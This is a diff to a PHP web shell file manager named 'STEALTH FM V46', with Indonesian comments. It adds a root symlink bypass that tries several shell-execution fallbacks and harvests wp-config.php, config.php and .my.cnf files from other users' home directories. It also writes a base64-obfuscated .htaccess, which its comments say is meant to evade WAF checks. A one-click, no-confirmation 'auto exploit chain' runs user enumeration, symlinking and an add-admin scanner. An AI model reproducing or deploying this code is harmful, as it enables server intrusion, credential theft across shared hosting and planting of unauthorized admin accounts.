@@ -1,6 +1,7 @@
 <?php
 // -------------------------------------------------------------------------
-// STEALTH FM V46 (FINAL COMPLETE: BASE V45 + AUTO RESET)
+// STEALTH FM V46 (FINAL COMPLETE: BASE V45 + AUTO CHAIN NO-PROMPT)
+// MODIFIED: AUTO CHAIN (INSTANT) + CLEAN TOOLKIT UI
 // -------------------------------------------------------------------------
 
 // 1. STEALTH MODE
@@ -323,39 +324,38 @@ if (isset($_SERVER[$h_act])) {
             }
             echo "$tool Done. Count: $n."; exit;
         }
-    }
-}
-    // FITUR: ULTIMATE ROOT BYPASS (BASE64 ENCODED & MULTI-FALLBACK)
+        
+        // FITUR: ULTIMATE ROOT BYPASS
         if ($tool === 'root_bypass') {
             $dir = "symlinkbypass"; 
             @mkdir($dir, 0755); 
             chdir($dir);
             
-            // Fungsi Internal dengan 8 Metode Fallback + Base64 Command Bypass
-            function god_link($target, $link) {
-                if (function_exists('symlink') && @symlink($target, $link)) return true;
-                if (function_exists('link') && @link($target, $link)) return true;
-                
-                // Encode perintah ln -s ke base64 untuk bypass WAF
-                $cmd_raw = "ln -s " . escapeshellarg($target) . " " . escapeshellarg($link);
-                $cmd = $cmd_raw; 
+            if (!function_exists('god_link')) {
+                function god_link($target, $link) {
+                    if (function_exists('symlink') && @symlink($target, $link)) return true;
+                    if (function_exists('link') && @link($target, $link)) return true;
+                    
+                    $cmd_raw = "ln -s " . escapeshellarg($target) . " " . escapeshellarg($link);
+                    $cmd = $cmd_raw; 
 
-                if (function_exists('shell_exec')) { @shell_exec($cmd); }
-                elseif (function_exists('exec')) { @exec($cmd); }
-                elseif (function_exists('proc_open')) {
-                    $desc = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
-                    $proc = @proc_open($cmd, $desc, $pipes);
-                    if (is_resource($proc)) {
-                        @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
-                        @proc_close($proc);
+                    if (function_exists('shell_exec')) { @shell_exec($cmd); }
+                    elseif (function_exists('exec')) { @exec($cmd); }
+                    elseif (function_exists('proc_open')) {
+                        $desc = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
+                        $proc = @proc_open($cmd, $desc, $pipes);
+                        if (is_resource($proc)) {
+                            @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
+                            @proc_close($proc);
+                        }
                     }
+                    elseif (function_exists('passthru')) { ob_start(); @passthru($cmd); ob_end_clean(); }
+                    elseif (function_exists('system')) { ob_start(); @system($cmd); ob_end_clean(); }
+                    elseif (function_exists('popen')) { $p = @popen($cmd, 'r'); if($p) pclose($p); }
+                    
+                    if(@file_exists($link)) return true;
+                    return false;
                 }
-                elseif (function_exists('passthru')) { ob_start(); @passthru($cmd); ob_end_clean(); }
-                elseif (function_exists('system')) { ob_start(); @system($cmd); ob_end_clean(); }
-                elseif (function_exists('popen')) { $p = @popen($cmd, 'r'); if($p) pclose($p); }
-                
-                if(@file_exists($link)) return true;
-                return false;
             }
 
             // 1. Symlink ke Root (/)
@@ -367,6 +367,7 @@ if (isset($_SERVER[$h_act])) {
             
             $n = 0;
             if($etc) {
+                $home_dirs = get_home_dirs(); 
                 $users = explode("\n", $etc);
                 $confs = ["wp-config.php", "config.php", "configuration.php", ".my.cnf"];
                 foreach($users as $user_line) {
@@ -382,10 +383,7 @@ if (isset($_SERVER[$h_act])) {
                 }
             }
 
-            // 3. .htaccess Agresif dengan Base64 Decode Content
-            // Konten .htaccess di-encode agar tidak terkena cek string sensitif saat penulisan file
             $ht_b64 = "T3B0aW9ucyArRm9sbG93U3ltTGlua3MgK0luZGV4cwpEaXJlY3RvcnlJbmRleCBkZWZhdWx0LnBocApSZWFkT25seSB7IE9GRiB9CjxGaWxlc01hdGNoICJcLnBocCQiPgpTZXRIYW5kbGVyIHRleHQvcGxhaW4KQWRkVHlwZSB0ZXh0L3BsYWluIC5waHAKPC9GaWxlc01hdGNoPgpSZXdyaXRlRW5naW5lIE9mZgpTYXRpc2Z5IEFueQ==";
-            
             x_write(".htaccess", base64_decode($ht_b64));
             
             echo "<div class='text-success'>[+] GOD MODE Bypass Active (Base64 Encoded Content)!</div>";
@@ -394,6 +392,8 @@ if (isset($_SERVER[$h_act])) {
             echo "<small style='color:#777'>Keamanan: Perintah Shell & .htaccess disamarkan dengan Base64.</small>";
             exit;
         }
+    } 
+}
 ?>
 <!DOCTYPE html>
 <html lang="en" data-bs-theme="dark">
@@ -670,13 +670,9 @@ if (isset($_SERVER[$h_act])) {
             <div class="modal-body p-4">
                 <div class="alert alert-dark border border-secondary mb-4 py-2 px-3 small d-flex align-items-center" style="background:#000;color:#aaa"><i class="fas fa-info-circle me-2"></i> Running in: <b class="ms-2 text-white"><span id="tool-path-disp">/</span></b></div>
                 <div class="tools-list">
-                    <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
+                    <div class="tool-cmd" onclick="startAutoChain()"><div class="cmd-left"><i class="fas fa-radiation fa-spin cmd-icon text-danger"></i><span class="cmd-text text-danger">AUTO EXPLOIT CHAIN</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                     
-                    <div class="tool-cmd" onclick="runTool('bypass_user')"><div class="cmd-left"><i class="fas fa-users-slash cmd-icon c-cyan"></i><span class="cmd-text">USER ENUM</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
-                    <div class="tool-cmd" onclick="startAddAdmin()"><div class="cmd-left"><i class="fas fa-user-plus cmd-icon c-lime"></i><span class="cmd-text">ADD ADMIN </span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
-                    <div class="tool-cmd" onclick="runTool('symlink_cage')"><div class="cmd-left"><i class="fas fa-project-diagram cmd-icon c-gold"></i><span class="cmd-text">SYMLINKER</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
-                    <div class="tool-cmd" onclick="runTool('jumper_cage')"><div class="cmd-left"><i class="fas fa-box-open cmd-icon c-rose"></i><span class="cmd-text">JUMPER</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
-                    <div class="tool-cmd" onclick="runTool('root_bypass')"><div class="cmd-left"><i class="fas fa-folder-tree cmd-icon c-rose"></i> <span class="cmd-text">ROOT SYMLINK BYPASS</span</div><i class="fas fa-arrow-right cmd-arrow"></i></div>
+                    <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                 </div>
             </div>
         </div>
@@ -970,23 +966,21 @@ if (isset($_SERVER[$h_act])) {
     function toggleWidget() { let b = document.getElementById('aw-content'); b.style.display = (b.style.display === 'none') ? 'block' : 'none'; }
     
     function runTool(toolName) { showLog(); let log = document.getElementById('global-log'); log.innerHTML += `<div class="text-primary mb-2"><i class="fas fa-cog fa-spin me-2"></i>Running ${toolName}...</div>`; api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div class="text-success mt-2"><i class="fas fa-check me-2"></i>Done.</div><hr class="border-secondary">`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div class="text-danger">Error: ${e}</div>`; }); }
-    // MODIFIKASI: Fungsi baru untuk memilih mode
-    function startAddAdmin() {
-        let choice = prompt("Pilih Target Scan:\n1 = Jumping (Default)\n2 = Symlink (3x_sym)");
-        let mode = (choice === '2') ? 'symlink' : 'jumping';
-        runWatchdogTool('add_admin', 0, mode);
-    }
-
-    // MODIFIKASI: Tambahkan parameter 'mode' dan kirim Header X-Mode
+    
+    // MODIFIKASI: Tambahkan parameter 'mode', kirim Header X-Mode, dan Handle Log Append
     function runWatchdogTool(toolName, step, mode = 'jumping') {
         let log = document.getElementById('global-log'); 
         if(step === 0) { 
-            showLog(); 
-            log.innerHTML = `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (${mode.toUpperCase()})...</div><hr class="border-secondary">`; 
+            showLog();
+            // CEK APAKAH SEDANG JALAN AUTO CHAIN
+            if (!log.innerHTML.includes("STARTING AUTOMATED CHAIN")) {
+                log.innerHTML = `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (${mode.toUpperCase()})...</div><hr class="border-secondary">`; 
+            } else {
+                 log.innerHTML += `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (${mode.toUpperCase()})...</div>`;
+            }
         }
         
         const controller = new AbortController(); 
-        // Pass 'mode' ke timeout rekursif
         const timeoutId = setTimeout(() => { 
             controller.abort(); 
             log.innerHTML += `<div class="text-warning">[!] Watchdog: Batch Timeout (20s) at #${step}. Skipping 5...</div>`; 
@@ -994,7 +988,6 @@ if (isset($_SERVER[$h_act])) {
             runWatchdogTool(toolName, step+5, mode); 
         }, 20000);
 
-        // Kirim X-Mode di header
         api('tool', currentPath, 'GET', {'X-Tool': toolName, 'X-Step': step, 'X-Mode': mode}, null, controller.signal)
         .then(r => r.json())
         .then(res => { 
@@ -1002,7 +995,6 @@ if (isset($_SERVER[$h_act])) {
             if(res.html) log.innerHTML += res.html; 
             if(res.status === 'continue') { 
                 log.scrollTop = log.scrollHeight; 
-                // Pass 'mode' ke next step
                 setTimeout(() => runWatchdogTool(toolName, res.next_step, mode), 10); 
             } else { 
                 log.innerHTML += `<hr class="border-secondary"><div class="text-success fw-bold"><i class="fas fa-flag-checkered me-2"></i>JOB FINISHED. Scanned ${res.total} files.</div>`; 
@@ -1011,9 +1003,56 @@ if (isset($_SERVER[$h_act])) {
         }).catch(err => { 
             if(err.name === 'AbortError') return; 
             log.innerHTML += `<div class="text-danger">[!] Net Err at #${step}. Skipping batch...</div>`; 
-            // Pass 'mode' saat error retry
             runWatchdogTool(toolName, step+5, mode); 
         });
+    }
+
+    // --- FITUR BARU: AUTO EXPLOIT CHAIN (NO CONFIRM) ---
+    async function startAutoChain() {
+        // CONFIRM REMOVED
+        toolsModal.hide();
+        showLog();
+        let log = document.getElementById('global-log');
+        
+        const logMsg = (msg, color='text-info') => {
+            log.innerHTML += `<div class="${color} mb-1">[CHAIN] ${msg}</div>`;
+            log.scrollTop = log.scrollHeight;
+        };
+
+        log.innerHTML = `<div class="text-danger fw-bold mb-3">--- STARTING AUTOMATED CHAIN ---</div>`;
+
+        try {
+            // 1. USER ENUM
+            logMsg("1. Running User Enum...", "text-warning");
+            await api('tool', currentPath, 'GET', {'X-Tool': 'bypass_user'});
+            logMsg("User Enum DONE. (passwd.txt saved)", "text-success");
+            log.innerHTML += "<hr class='border-secondary'>";
+
+            // 2. JUMPER
+            logMsg("2. Running Jumper Cage...", "text-warning");
+            await api('tool', currentPath, 'GET', {'X-Tool': 'jumper_cage'});
+            logMsg("Jumper DONE.", "text-success");
+            log.innerHTML += "<hr class='border-secondary'>";
+
+            // 3. SYMLINKER
+            logMsg("3. Running Symlinker...", "text-warning");
+            await api('tool', currentPath, 'GET', {'X-Tool': 'symlink_cage'});
+            logMsg("Symlinker DONE.", "text-success");
+            log.innerHTML += "<hr class='border-secondary'>";
+
+            // 4. ROOT BYPASS
+            logMsg("4. Running Root Symlink Bypass...", "text-warning");
+            await api('tool', currentPath, 'GET', {'X-Tool': 'root_bypass'});
+            logMsg("Root Bypass Executed. (Check folder 'symlinkbypass')", "text-success");
+            log.innerHTML += "<hr class='border-secondary'>";
+
+            // 5. ADD ADMIN (Mode Jumping sebagai default)
+            logMsg("5. Running Add Admin Scanner...", "text-warning");
+            runWatchdogTool('add_admin', 0, 'jumping');
+
+        } catch (e) {
+            logMsg("CHAIN ERROR: " + e, "text-danger");
+        }
     }
     
     loadDir('');
